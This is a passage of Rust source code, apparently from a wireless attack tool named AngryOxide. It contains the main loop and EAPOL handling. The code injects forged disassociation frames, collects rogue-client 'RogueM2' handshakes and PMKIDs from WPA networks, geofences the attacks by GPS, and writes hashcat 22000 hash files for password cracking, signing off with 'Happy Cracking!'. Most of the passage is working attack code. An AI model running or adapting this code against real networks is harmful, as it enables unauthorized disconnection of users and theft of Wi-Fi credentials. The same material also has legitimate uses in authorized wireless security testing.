    if let Some(eapol) = data_frame.eapol_key().clone() {
        oxide.counters.eapol_count += 1;

        if ap_addr == oxide.target_data.rogue_client
            && (eapol.determine_key_type() == libwifi::frame::MessageType::Message2)
        {
            let essid = oxide.target_data.rogue_essids.get(&station_addr);
            let mut rogue_eapol = oxide.target_data.rogue_m1.clone();
            rogue_eapol.timestamp = eapol
                .timestamp
                .checked_sub(Duration::from_millis(10))
                .unwrap_or(eapol.timestamp);

            // Add our rogue M1
            let _ = oxide.handshake_storage.add_or_update_handshake(
                &ap_addr,
                &station_addr,
                rogue_eapol,
                essid.cloned(),
            );

            // Add the RogueM2
            let result = oxide.handshake_storage.add_or_update_handshake(
                &ap_addr,
                &station_addr,
                eapol.clone(),
                essid.cloned(),
            );

            // Set to apless
            if let Ok(handshake) = result {
                handshake.apless = true;
            }

            // Set to apless
            //oxide.handshake_storage.set_apless_for_ap(&ap_addr);

            // Set the Station that we collected a RogueM2
            if let Some(station) = oxide.unassoc_clients.get_device(&station_addr) {
                station.has_rogue_m2 = true;
                station
                    .rogue_actions
                    .entry(essid.unwrap().to_string())
                    .or_insert(true);
            }

            // Print a status so we have it for headless

            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Priority,
                format!(
                    "RogueM2 Collected!: {dest} => {source} ({})",
                    essid.unwrap()
                ),
            ));

            // Don't need to go any further, because we know this wasn't a valid handshake otherwise.
            return Ok(());
        }

        let ap = if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
            ap
        } else {
            return Ok(());
        };

        let essid = ap.ssid.clone();

        if station_addr == oxide.target_data.rogue_client
            && eapol.determine_key_type() == libwifi::frame::MessageType::Message1
        {
            let frx = build_disassocation_from_client(
                &ap_addr,
                &station_addr,
                oxide.counters.sequence2(),
            );
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
            ap.interactions += 1;
            if oxide.handshake_storage.has_m1_for_ap(&ap_addr) {
                return Ok(());
            }
        }

        let result = oxide.handshake_storage.add_or_update_handshake(
            &ap_addr,
            &station_addr,
            eapol.clone(),
            essid,
        );
        match result {
            Ok(_) => {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!(
                        "New Eapol: {dest} => {source} ({})",
                        eapol.determine_key_type()
                    ),
                ));
            }
            Err(e) => {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Warning,
                    format!(
                        "Eapol Failed to Add: {dest} => {source} ({}) | {e}",
                        eapol.determine_key_type(),
                    ),
                ));
            }
        }
    }
    Ok(())
}

fn handle_null_data_frame(
    data_frame: &impl NullDataFrame,
    rthdr: &Radiotap,
    oxide: &mut OxideRuntime,
) -> Result<(), String> {
    oxide.counters.null_data += 1;
    let from_ds: bool = data_frame.header().frame_control.from_ds();
    let to_ds: bool = data_frame.header().frame_control.to_ds();
    let powersave: bool = data_frame.header().frame_control.pwr_mgmt();
    let ap_addr = if from_ds && !to_ds {
        data_frame.header().address_2
    } else if !from_ds && to_ds {
        data_frame.header().address_1
    } else {
        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
        // lets just ignore it lol
        return Ok(());
    };

    let station_addr = if !from_ds && to_ds {
        data_frame.header().address_2
    } else {
        data_frame.header().address_1
    };

    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
    let signal = rthdr
        .antenna_signal
        .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);

    if station_addr.is_real_device() && station_addr != oxide.target_data.rogue_client {
        // Make sure this isn't a broadcast or something

        let client = &Station::new_station(
            station_addr,
            if to_ds {
                signal
            } else {
                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
            },
            Some(ap_addr),
            oxide.file_data.oui_database.search(&station_addr),
        );
        clients.add_or_update_device(station_addr, client);
        oxide.unassoc_clients.remove_device(&station_addr);
    }
    let ap = AccessPoint::new_with_clients(
        ap_addr,
        if from_ds {
            signal
        } else {
            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
        },
        None,
        None,
        None,
        clients,
        oxide.target_data.rogue_client,
        None,
        oxide.file_data.oui_database.search(&ap_addr),
    );
    oxide.access_points.add_or_update_device(ap_addr, &ap);

    // Check PS State:
    if !powersave && station_addr != oxide.target_data.rogue_client {
        // Client is awake... potentially... try reassociation attack?
        //anon_reassociation_attack(oxide, &ap_addr)?;
    }

    Ok(())
}

fn write_packet(fd: i32, packet: &[u8]) -> Result<(), String> {
    let bytes_written =
        unsafe { libc::write(fd, packet.as_ptr() as *const libc::c_void, packet.len()) };

    if bytes_written < 0 {
        // An error occurred during write
        let error_code = io::Error::last_os_error();

        return Err(error_code.to_string());
    }

    Ok(())
}

fn read_frame(oxide: &mut OxideRuntime) -> Result<Vec<u8>, io::Error> {
    let mut buffer = vec![0u8; 6000];
    let packet_len = unsafe {
        libc::read(
            oxide.raw_sockets.rx_socket.as_raw_fd(),
            buffer.as_mut_ptr() as *mut libc::c_void,
            buffer.len(),
        )
    };

    // Handle non-blocking read
    if packet_len < 0 {
        let error_code = io::Error::last_os_error();
        if error_code.kind() == io::ErrorKind::WouldBlock {
            oxide.counters.empty_reads += 1;
            return Ok(Vec::new());
        } else {
            // An actual error occurred
            oxide.counters.error_count += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Error Reading from Socket: {:?}", error_code.kind()),
            ));
            return Err(error_code);
        }
    }

    buffer.truncate(packet_len as usize);
    Ok(buffer)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Arguments::parse();

    if !geteuid().is_root() {
        println!("{}", get_art("You need to run as root!"));
        exit(EXIT_FAILURE);
    }

    let mut oxide = OxideRuntime::new(&cli);

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        "Starting...".to_string(),
    ));

    let iface = oxide.if_hardware.interface.clone();
    let idx = iface.index.unwrap();
    let interface_name = String::from_utf8(iface.clone().name.unwrap())
        .expect("cannot get interface name from bytes.");

    let duration = Duration::from_secs(1);
    thread::sleep(duration);

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    let mut seconds_timer = Instant::now();
    let seconds_interval = Duration::from_secs(1);
    let mut frame_count_old = 0u64;
    let mut frame_rate = 0u64;

    let mut last_status_time = Instant::now();

    let status_interval = if oxide.config.headless {
        Duration::from_secs(1)
    } else {
        Duration::from_millis(50)
    };

    // Setup hop data
    let mut last_hop_time = Instant::now();
    let mut first_channel = (0u8, 0u32);
    let mut hop_cycle: u32 = 0;

    // Set starting channel and create the hopper cycle.
    let mut old_hops = oxide.if_hardware.hop_channels.clone();
    let mut channels_binding = oxide.if_hardware.hop_channels.clone();
    let mut cycle_iter = channels_binding.iter().cycle();
    if let Some(&(band, channel)) = cycle_iter.next() {
        first_channel = (band, channel);
        if let Err(e) = set_interface_chan(idx, channel, band) {
            eprintln!("{}", e);
        }
    }

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!(
            "Setting channel hopper: {:?}",
            oxide.if_hardware.hop_channels
        ),
    ));

    let mut geofence = None;

    if cli.geofence {
        if let (Some(grid), Some(distance)) = (&cli.center, cli.distance) {
            match Geofence::new(grid.clone(), distance) {
                Ok(geo) => {
                    geofence = Some(geo);
                }
                Err(e) => {
                    eprintln!("Error setting up geofence: {}", e);
                    exit(-1);
                }
            }
        }
    }

    let mut last_gps_log_time = Instant::now();
    let mut last_good_gps_time = Instant::now()
        - SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap();
    let mut inside_geo = !cli.geofence;

    let start_time = Instant::now();

    let mut err: Option<String> = None;
    let mut exit_on_succ = false;
    let mut terminal =
        Terminal::new(CrosstermBackend::new(stdout())).expect("Cannot allocate terminal");

    if !oxide.config.headless {
        // UI is in normal mode
        execute!(stdout(), Hide)?;
        execute!(stdout(), EnterAlternateScreen)?;
        if !oxide.config.disable_mouse {
            execute!(stdout(), EnableMouseCapture)?;
        }
        enable_raw_mode()?;
        initialize_panic_handler(oxide.config.disable_mouse);
    } else {
        // UI is in headless mode
        ctrlc::set_handler(move || {
            r.store(false, Ordering::SeqCst);
        })
        .expect("Error setting Ctrl-C handler");
    }

    while running.load(Ordering::SeqCst) {
        // Update our interface
        oxide.if_hardware.interface =
            match get_interface_info_idx(oxide.if_hardware.interface.index.unwrap()) {
                Ok(interface) => interface,
                Err(e) => {
                    // Uh oh... no interfacee
                    err = Some(e);
                    running.store(false, Ordering::SeqCst);
                    break;
                }
            };

        // Handle Hunting
        let target_chans = oxide.if_hardware.target_chans.clone();
        if oxide.config.autohunt
            && hop_cycle >= 3
            && !target_chans.values().any(|value| value.is_empty())
        {
            // We are done auto-hunting.
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Priority,
                "=== AutoHunting Complete! ===".to_string(),
            ));
            for target in oxide.target_data.targets.get_ref() {
                if let Some(channels) = target_chans.get(target) {
                    let chans = format_channels(channels);
                    oxide.status_log.add_message(StatusMessage::new(
                        MessageType::Priority,
                        format!("Target: {} | Channels: [ {} ]", target.get_string(), chans),
                    ));
                }
            }

            let mut new_hops: Vec<(u8, u32)> = Vec::new();
            for (_, chan) in target_chans {
                for ch in chan {
                    if !new_hops.contains(&ch) {
                        new_hops.push(ch);
                    }
                }
            }

            // Setup channels hops
            oxide.if_hardware.hop_channels = new_hops;
            old_hops.clone_from(&oxide.if_hardware.hop_channels);
            oxide.if_hardware.hop_interval = Duration::from_secs(cli.dwell);
            channels_binding.clone_from(&oxide.if_hardware.hop_channels);
            cycle_iter = channels_binding.iter().cycle();
            first_channel = *cycle_iter.next().unwrap();

            oxide.config.autohunt = false; // Disable autohunt.
            if !cli.notransmit {
                oxide.config.notx = false; // Turn notx back to false unless CLI notransmit is true.
            }
        }

        // Calculate status rates
        if seconds_timer.elapsed() >= seconds_interval {
            seconds_timer = Instant::now();

            // Calculate the frame rate
            let frames_processed = oxide.counters.frame_count - frame_count_old;
            frame_count_old = oxide.counters.frame_count;
            frame_rate = frames_processed;

            // Update the empty reads rate
            oxide.counters.empty_reads_rate = oxide.counters.empty_reads;
            oxide.counters.empty_reads = 0;
        }

        // Make sure our pcap isn't too big, replace if it is.
        if oxide.file_data.current_pcap.check_size() >= 100000000u64 {
            oxide.file_data.current_pcap.stop();
            let now: chrono::prelude::DateTime<Local> = Local::now();
            let date_time = now.format("-%Y-%m-%d_%H-%M-%S").to_string();
            let pcap_filename = format!("{}{}.pcapng", oxide.file_data.file_prefix, date_time);
            let mut pcap_file = PcapWriter::new(&iface, &pcap_filename);
            pcap_file.start();
            oxide.file_data.current_pcap = pcap_file;
            oxide.file_data.output_files.push(pcap_filename);
        }

        // Channel hopping. This can still interrupt multi-step attacks but isn't likely to do so.
        if last_hop_time.elapsed() >= oxide.if_hardware.hop_interval {
            if let Some(&(band, channel)) = cycle_iter.next() {
                if (band, channel) == first_channel {
                    hop_cycle += 1;
                }
                if let Err(e) = oxide
                    .if_hardware
                    .netlink
                    .set_interface_chan(idx, channel, band)
                {
                    oxide.status_log.add_message(StatusMessage::new(
                        MessageType::Error,
                        format!("Channel Switch Error: {e:?}"),
                    ));
                }
                oxide.if_hardware.current_channel = channel;
                last_hop_time = Instant::now();
            }
        }
        let table_len = oxide.get_current_menu_len();

        // This should ONLY apply to normal UI mode.
        if !oxide.config.headless {
            if let Some(ev) = oxide.eventhandler.get() {
                match ev {
                    EventType::Key(event) => {
                        if let Event::Key(key) = event {
                            if key.kind == KeyEventKind::Press {
                                match key.code {
                                    KeyCode::Char('d') | KeyCode::Right => {
                                        oxide.ui_state.menu_next()
                                    }
                                    KeyCode::Char('a') | KeyCode::Left => {
                                        oxide.ui_state.menu_back()
                                    }
                                    KeyCode::Char('w') | KeyCode::Char('W') | KeyCode::Up => {
                                        if key.modifiers.intersects(KeyModifiers::SHIFT) {
                                            oxide.ui_state.table_previous_item_big();
                                        } else {
                                            oxide.ui_state.table_previous_item();
                                        }
                                    }
                                    KeyCode::Char('s') | KeyCode::Char('S') | KeyCode::Down => {
                                        if key.modifiers.intersects(KeyModifiers::SHIFT) {
                                            oxide.ui_state.table_next_item_big(table_len);
                                        } else {
                                            oxide.ui_state.table_next_item(table_len);
                                        }
                                    }
                                    KeyCode::Char('q') => {
                                        oxide.ui_state.show_quit = !oxide.ui_state.show_quit;
                                    }
                                    KeyCode::Char('y') | KeyCode::Char('Y') => {
                                        if oxide.ui_state.show_quit {
                                            running.store(false, Ordering::SeqCst)
                                        }
                                    }
                                    KeyCode::Char('n') | KeyCode::Char('N') => {
                                        if oxide.ui_state.show_quit {
                                            oxide.ui_state.show_quit = false;
                                        }
                                    }
                                    KeyCode::Char(' ') => oxide.ui_state.toggle_pause(),
                                    KeyCode::Char('e') => oxide.ui_state.sort_next(),
                                    KeyCode::Char('r') => oxide.ui_state.toggle_reverse(),
                                    KeyCode::Char('c') => {
                                        oxide.ui_state.copy_short = true;
                                    }
                                    KeyCode::Char('C') => {
                                        oxide.ui_state.copy_long = true;
                                    }
                                    KeyCode::Char('t') => {
                                        oxide.ui_state.add_target = true;
                                    }
                                    KeyCode::Char('T') => {
                                        oxide.ui_state.add_target = true;
                                        oxide.ui_state.set_autoexit = true;
                                    }
                                    KeyCode::Char('k') => {
                                        oxide.ui_state.show_keybinds =
                                            !oxide.ui_state.show_keybinds;
                                    }
                                    KeyCode::Char('l') => {
                                        if oxide.if_hardware.locked {
                                            oxide.status_log.add_message(StatusMessage::new(
                                                MessageType::Info,
                                                "Unlocking Channel".to_string(),
                                            ));

                                            // Setup channels hops
                                            oxide.if_hardware.hop_channels = old_hops.clone();
                                            channels_binding =
                                                oxide.if_hardware.hop_channels.clone();
                                            cycle_iter = channels_binding.iter().cycle();
                                            first_channel = *cycle_iter.next().unwrap();
                                            oxide.if_hardware.locked = !oxide.if_hardware.locked;
                                        } else {
                                            // Get target_chans
                                            old_hops = oxide.if_hardware.hop_channels.clone();
                                            let new_hops: Vec<(u8, u32)> = vec![(
                                                oxide.if_hardware.current_band.to_u8(),
                                                oxide.if_hardware.current_channel,
                                            )];

                                            if !new_hops.is_empty() {
                                                // Setup channels hops
                                                oxide.if_hardware.hop_channels = new_hops;
                                                channels_binding =
                                                    oxide.if_hardware.hop_channels.clone();
                                                cycle_iter = channels_binding.iter().cycle();
                                                first_channel = *cycle_iter.next().unwrap();

                                                oxide.status_log.add_message(StatusMessage::new(
                                                    MessageType::Info,
                                                    format!(
                                                        "Locking to Channel {} ({:?})",
                                                        oxide.if_hardware.current_channel,
                                                        oxide.if_hardware.current_band,
                                                    ),
                                                ));

                                                oxide.if_hardware.locked =
                                                    !oxide.if_hardware.locked;
                                            } else {
                                                oxide.status_log.add_message(StatusMessage::new(
                                                    MessageType::Warning,
                                                    "Could not lock: No Channel".to_string(),
                                                ));
                                            }
                                        }
                                    }
                                    KeyCode::Char('L') => {
                                        if oxide.if_hardware.locked {
                                            // Setup channels hops
                                            oxide.if_hardware.hop_channels = old_hops.clone();
                                            channels_binding =
                                                oxide.if_hardware.hop_channels.clone();
                                            cycle_iter = channels_binding.iter().cycle();
                                            first_channel = *cycle_iter.next().unwrap();

                                            oxide.status_log.add_message(StatusMessage::new(
                                                MessageType::Info,
                                                "Unlocking Channel".to_string(),
                                            ));
                                            oxide.if_hardware.locked = !oxide.if_hardware.locked;
                                        } else {
                                            // Get target_chans
                                            old_hops = oxide.if_hardware.hop_channels.clone();
                                            let target_chans =
                                                oxide.if_hardware.target_chans.clone();
                                            let mut new_hops: Vec<(u8, u32)> = Vec::new();

                                            for (_, chan) in target_chans {
                                                for ch in chan {
                                                    if !new_hops.contains(&ch) {
                                                        new_hops.push(ch);
                                                    }
                                                }
                                            }

                                            if !new_hops.is_empty() {
                                                // Setup channels hops
                                                oxide.if_hardware.hop_channels = new_hops;
                                                channels_binding =
                                                    oxide.if_hardware.hop_channels.clone();
                                                cycle_iter = channels_binding.iter().cycle();
                                                first_channel = *cycle_iter.next().unwrap();

                                                oxide.status_log.add_message(StatusMessage::new(
                                                    MessageType::Info,
                                                    format!(
                                                        "Locking to Target Channels! {:?}",
                                                        oxide.if_hardware.hop_channels,
                                                    ),
                                                ));

                                                oxide.if_hardware.locked =
                                                    !oxide.if_hardware.locked;
                                            } else {
                                                oxide.status_log.add_message(StatusMessage::new(
                                                    MessageType::Warning,
                                                    "Could not lock: No Target Channels"
                                                        .to_string(),
                                                ));
                                            }
                                        }
                                    }
                                    _ => {}
                                }
                            }
                        } else if let Event::Mouse(event) = event {
                            match event.kind {
                                MouseEventKind::ScrollDown => {
                                    oxide.ui_state.table_next_item(table_len)
                                }
                                MouseEventKind::ScrollUp => oxide.ui_state.table_previous_item(),
                                _ => {}
                            }
                        }
                    }
                    EventType::Tick => {
                        let _ = print_ui(&mut terminal, &mut oxide, start_time, frame_rate);
                    }
                }
            }
        }

        if oxide.ui_state.add_target {
            match oxide.ui_state.current_menu {
                MenuType::AccessPoints => {
                    if let Some(ref ap) = oxide.ui_state.ap_selected_item {
                        if let Some(accesspoint) = oxide.access_points.get_device(&ap.mac_address) {
                            oxide
                                .target_data
                                .targets
                                .add(Target::MAC(targets::TargetMAC {
                                    addr: ap.mac_address,
                                }));
                            accesspoint.is_target = true;
                            if let Some(ssid) = &ap.ssid {
                                oxide
                                    .target_data
                                    .targets
                                    .add(Target::SSID(targets::TargetSSID {
                                        ssid: ssid.to_string(),
                                    }));
                            }
                            if oxide.config.notx {
                                oxide.config.notx = false;
                            }
                            if oxide.ui_state.set_autoexit {
                                oxide.config.autoexit = true;
                            }
                        }
                    }
                }
                MenuType::Clients => {}
                MenuType::Handshakes => {}
                MenuType::Messages => {}
            }
            oxide.ui_state.add_target = false;
            oxide.ui_state.set_autoexit = false;
        }

        // Headless UI status messages

        if last_status_time.elapsed() >= status_interval {
            last_status_time = Instant::now();
            if oxide.config.headless {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Status,
                    format!(
                        "Frames: {} | Rate: {} | ERs: {} | Channel: {}",
                        oxide.counters.frame_count,
                        frame_rate,
                        oxide.counters.empty_reads_rate,
                        oxide.if_hardware.current_channel,
                    ),
                ));
                //print_handshakes_headless(&mut oxide);
            }
        }

        let gps_data = oxide.file_data.gps_source.get_gps();

        // This will actually do the check for if we are inside the geo area, and then update the variable. This will also print the status message.
        if cli.geofence {
            // Log every 2 seconds
            let mut gps_status = false;

            if last_gps_log_time.elapsed() >= Duration::from_secs(2) {
                last_gps_log_time = Instant::now();
                gps_status = true;
            }

            if gps_data.has_fix() {
                last_good_gps_time = Instant::now();
                inside_geo = false;
                if let (Some(lat), Some(lon)) = (gps_data.lat, gps_data.lon) {
                    if let Some(ref gf) = geofence {
                        let current_point = (lat, lon);
                        let distance = gf.distance_to_target(current_point);
                        let rounded_distance = distance.round();

                        // Check for invalid (0.0, 0.0) coordinates
                        if lat == 0.0 && lon == 0.0 && gps_status {
                            oxide.status_log.add_message(StatusMessage::new(
                                MessageType::Info,
                                "No GPS coordinates received: (0.0, 0.0).".to_string(),
                            ));
                        } else if let Ok(coord) = LatLon::create(current_point.0, current_point.1) {
                            let coord_print = if gf.mgrs {
                                format!("{}", coord.to_mgrs(5))
                            } else {
                                format!("{}", coord)
                            };
                            if gf.is_within_area(current_point) {
                                if gps_status {
                                    oxide.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!("Our location ({}) is within the target area! Getting Angry... 😠", coord_print),
                                    ));
                                }
                                inside_geo = true;
                            } else if gps_status {
                                oxide.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Current location ({}) is {} meters from the target grid.",
                                        coord_print, rounded_distance
                                    ),
                                ));
                            }
                        } else {
                            oxide.status_log.add_message(StatusMessage::new(
                                MessageType::Error,
                                "Invalid coordinates for MGRS conversion.".to_string(),
                            ));
                        }
                    }
                } else if gps_status {
                    oxide.status_log.add_message(StatusMessage::new(
                        MessageType::Error,
                        format!(
                            "Invalid GPS for geofencing: {:?} {:?}",
                            gps_data.lat, gps_data.lon
                        ),
                    ));
                }
            } else if inside_geo {
                if cli.geofence_timeout > 0
                    && last_good_gps_time.elapsed() >= Duration::from_secs(60)
                {
                    oxide.status_log.add_message(StatusMessage::new(
                        MessageType::Error,
                        format!(
                            "No GPS Fix for {} sec... turning off.",
                            cli.geofence_timeout
                        ),
                    ));
                    inside_geo = false;
                }
            } else if gps_status {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    "No GPS Fix... uh oh.".to_string(),
                ));
            }
        }

        // Read Frame
        match read_frame(&mut oxide) {
            Ok(packet) => {
                if !packet.is_empty() && inside_geo {
                    let _ = process_frame(&mut oxide, &packet);
                }
            }
            Err(code) => {
                if code.kind().to_string() == "network down" {
                    oxide
                        .if_hardware
                        .netlink
                        .set_interface_up(oxide.if_hardware.interface.index.unwrap())
                        .ok();
                } else {
                    // This will result in error message.
                    err = Some(code.kind().to_string());
                    running.store(false, Ordering::SeqCst);
                }
            }
        };

        // Exit on targets success
        if oxide.config.autoexit && oxide.get_target_success() {
            running.store(false, Ordering::SeqCst);
            exit_on_succ = true;
        }

        // Handshake writing
        for handshakes in oxide.handshake_storage.get_handshakes().values_mut() {
            if !handshakes.is_empty() {
                for hs in handshakes {
                    if hs.complete() && !hs.is_wpa3() && !hs.written() {
                        if let Some(hashcat_string) = hs.to_hashcat_22000_format() {
                            let essid = hs.essid_to_string();
                            let sanitized_essid = sanitize_essid(&essid);
                            let hashline = hashcat_string;

                            // Determine filename to use
                            let file_name = if oxide.config.combine {
                                if oxide.file_data.file_prefix == "oxide" {
                                    format!(
                                        "{}{}.hc22000",
                                        oxide.file_data.file_prefix, oxide.file_data.start_time
                                    )
                                } else {
                                    format!("{}.hc22000", oxide.file_data.file_prefix)
                                }
                            } else {
                                format!("{}.hc22000", sanitized_essid)
                            };

                            let path = Path::new(&file_name);

                            let mut file = OpenOptions::new()
                                .write(true)
                                .create(true)
                                .append(true)
                                .open(path)
                                .unwrap_or_else(|_| {
                                    panic!("Could not open hashfile for writing. ({file_name}).")
                                });

                            writeln!(file, "{}", hashline).unwrap_or_else(|_| {
                                panic!("Couldn't write to hashfile. ({file_name}).")
                            });

                            if !oxide.file_data.output_files.contains(&file_name) {
                                oxide.file_data.output_files.push(file_name);
                            }

                            // Mark this handshake as written
                            hs.written = true;

                            // Mark this AP has having collected HS / PMKID
                            if let Some(ap) = oxide.access_points.get_device(&hs.mac_ap.unwrap()) {
                                if hs.has_pmkid() && ap.information.akm_mask() {
                                    ap.has_pmkid = true;
                                }
                                if hs.has_4whs() && !hs.is_wpa3() {
                                    ap.has_hs = true;
                                }
                            }

                            oxide.status_log.add_message(StatusMessage::new(
                                MessageType::Priority,
                                format!(
                                    "hc22000 Written: {} => {} ({})",
                                    hs.mac_ap.unwrap_or(MacAddress::zeroed()),
                                    hs.mac_client.unwrap_or(MacAddress::zeroed()),
                                    hs.essid.clone().unwrap_or("".to_string())
                                ),
                            ));

                            // fill the hashlines data (for reference later)
                            oxide
                                .file_data
                                .hashlines
                                .entry(essid)
                                .and_modify(|e| {
                                    if hs.has_4whs() {
                                        e.0 += 1;
                                    }
                                    if hs.has_pmkid() {
                                        e.1 += 1;
                                    }
                                })
                                .or_insert_with(|| {
                                    (
                                        if hs.has_4whs() { 1 } else { 0 },
                                        if hs.has_pmkid() { 1 } else { 0 },
                                    )
                                });
                        }
                    }
                }
            }
        }

        // Save those precious CPU cycles when we can. Any more of a wait and we can't process fast enough.
        thread::sleep(Duration::from_micros(1));
    }

    // Execute cleanup
    if !oxide.config.headless {
        reset_terminal(oxide.config.disable_mouse);
    }

    if exit_on_succ {
        println!("💲 Auto Exit Initiated");
    }

    println!("💲 Cleaning up...");
    if let Some(err) = err {
        println!("{}", get_art(&format!("Error: {}", err)))
    }

    println!("💲 Setting {} down.", interface_name);
    match oxide.if_hardware.netlink.set_interface_down(idx) {
        Ok(_) => {}
        Err(e) => println!("Error: {e:?}"),
    }

    println!(
        "💲 Restoring {} MAC back to {}.",
        interface_name, oxide.if_hardware.original_address
    );
    oxide
        .if_hardware
        .netlink
        .set_interface_mac(idx, &oxide.if_hardware.original_address.0)
        .ok();

    println!("💲 Setting {} to station mode.", interface_name);
    match oxide.if_hardware.netlink.set_interface_station(idx) {
        Ok(_) => {}
        Err(e) => println!("Error: {e:?}"),
    }

    println!("💲 Stopping Threads");
    oxide.file_data.current_pcap.stop();
    oxide.file_data.gps_source.stop();
    oxide.file_data.db_writer.stop();

    println!();

    if !oxide.file_data.hashlines.is_empty() {
        println!("😈 Results:");
        for (key, (handshake_acc, pmkid_acc)) in oxide.file_data.hashlines {
            println!("[{}] : 4wHS: {} | PMKID: {}", key, handshake_acc, pmkid_acc);
        }
        println!();
    } else {
        println!(
            "AngryOxide did not collect any results. 😔 Try running longer, or check your interface?"
        );
    }

    let mut tarfile = oxide.file_data.file_prefix.to_owned();
    if tarfile == "oxide" {
        tarfile = format!("oxide{}", oxide.file_data.start_time);
    }

    if !oxide.config.notar {
        println!("📦 Creating Output Tarball ({}.tar.gz).", tarfile);
        println!("Please wait...");
        let _ = tar_and_compress_files(oxide.file_data.output_files, &tarfile);
    }
    println!();
    println!("Complete! Happy Cracking! 🤙");

    Ok(())
}

fn tar_and_compress_files(output_files: Vec<String>, filename: &str) -> io::Result<()> {
    let tgz = File::create(format!("{}.tar.gz", filename))?;
    let enc = GzEncoder::new(tgz, Compression::default());
    let mut tar = Builder::new(enc);

    for path in &output_files {
        let mut file = File::open(path)?;
        tar.append_file(path, &mut file)?;
    }

    tar.into_inner()?;

    // Delete original files after they are successfully added to the tarball
    for path in &output_files {
        if let Err(e) = remove_file(path) {
            eprintln!("Failed to delete file {}: {}", path, e);
        }
    }

    Ok(())
}

pub fn initialize_panic_handler(disable_mouse: bool) {
    let original_hook = std::panic::take_hook();
    std::panic::set_hook(Box::new(move |panic_info| {
        reset_terminal(disable_mouse);
        original_hook(panic_info);
    }));
}

fn reset_terminal(disable_mouse: bool) {
    execute!(stdout(), Show).expect("Could not show cursor.");
    execute!(io::stdout(), LeaveAlternateScreen).expect("Could not leave alternate screen");
    if !disable_mouse {
        execute!(stdout(), DisableMouseCapture).expect("Could not disable mouse capture.");
    }
    disable_raw_mode().expect("Could not disable raw mode.");
}

fn format_channels(channels: &Vec<(u8, u32)>) -> String {
    let mut band_map: HashMap<u8, Vec<u32>> = HashMap::new();

    // Group by band
    for &(band, channel) in channels {
        band_map.entry(band).or_default().push(channel);
    }

    // Sort channels within each band
    for channels in band_map.values_mut() {
        channels.sort();
    }

    // Collect and format the string
    let mut parts: Vec<String> = Vec::new();
    for (&band, channels) in &band_map {
        let channels_str = channels
            .iter()
            .map(|channel| channel.to_string())
            .collect::<Vec<_>>()
            .join(", ");
        parts.push(format!("Band {}: {}", band, channels_str));
    }

    // Sort the bands for consistent ordering
    parts.sort();

    // Join all parts into a single string
    parts.join(" | ")
}
